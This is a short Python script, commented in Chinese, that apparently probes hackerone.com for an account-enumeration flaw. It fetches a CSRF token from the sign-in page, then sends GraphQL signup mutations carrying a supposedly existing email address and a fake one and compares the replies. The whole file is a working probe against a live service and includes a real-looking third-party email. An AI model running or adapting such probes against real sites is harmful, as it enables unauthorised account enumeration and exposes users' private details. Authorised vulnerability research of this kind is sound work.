# -*- coding: utf-8 -*-
"""匿名测 signupEntryLevelVdp 的 email 存在性 oracle
流程:GET /users/sign_in 拿 csrf meta -> POST /graphql
对比:已存在 email(1643584176@qq.com) vs 不存在 email
"""
import json
import re
import urllib.request
import urllib.parse

BASE = "https://hackerone.com"


def http(method, url, data=None, headers=None, timeout=20):
    req = urllib.request.Request(url, method=method)
    req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    req.add_header("Accept", "text/html,application/json,*/*")
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    body = json.dumps(data).encode() if data is not None else None
    if body is not None:
        req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, body, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace"), dict(r.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace"), dict(e.headers)


# 1. 拿登录页 CSRF
st, html, hdrs = http("GET", BASE + "/users/sign_in")
print("sign_in status:", st, "len:", len(html))
m = re.search(r'name="csrf-token" content="([^"]+)"', html)
csrf = m.group(1) if m else None
print("csrf found:", bool(csrf))

ql = """mutation {
  signupEntryLevelVdp(input: {
    name: "x", email: "%s", website: "https://example.com",
    company_name: "x", password: "Xy7!zzz", password_confirmation: "Xy7!zzz",
    tos_accept: true, title: "x"
  }) { was_successful errors { edges { node { message field } } } }
}"""

for label, email in [
    ("EXISTING", "1643584176@qq.com"),
    ("FAKE", "zzz_nonexistent_98231@example.com"),
]:
    h = {"X-CSRF-Token": csrf} if csrf else {}
    st, txt, hdrs = http("POST", BASE + "/graphql", {"query": ql % email}, h)
    print("----", label, "status:", st)
    print(txt[:1200])
